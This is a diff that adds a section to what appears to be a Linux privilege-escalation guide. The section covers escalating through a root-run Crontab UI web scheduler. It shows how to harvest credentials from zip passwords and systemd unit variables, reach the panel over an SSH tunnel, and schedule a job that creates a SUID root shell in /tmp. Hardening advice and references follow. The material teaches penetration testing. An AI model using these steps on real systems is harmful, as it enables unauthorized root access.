@@ -376,6 +376,39 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 
 ## Scheduled/Cron jobs
 
+### Crontab UI (alseambusher) running as root – web-based scheduler privesc
+
+If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.
+
+Typical chain
+- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
+- Find credentials in operational artifacts:
+  - Backups/scripts with `zip -P <password>`
+  - systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
+- Tunnel and login:
+```bash
+ssh -L 9001:localhost:8000 user@target
+# browse http://localhost:9001 and authenticate
+```
+- Create a high-priv job and run immediately (drops SUID shell):
+```bash
+# Name: escalate
+# Command:
+cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
+```
+- Use it:
+```bash
+/tmp/rootshell -p   # root shell
+```
+
+Hardening
+- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
+- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
+- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
+- Enable audit/logging for on-demand job executions
+
+
+
 Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
 
 ```bash
@@ -1715,6 +1748,10 @@ android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 **Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
 ## References
+
+- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
+- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
+
 
 - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 - [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
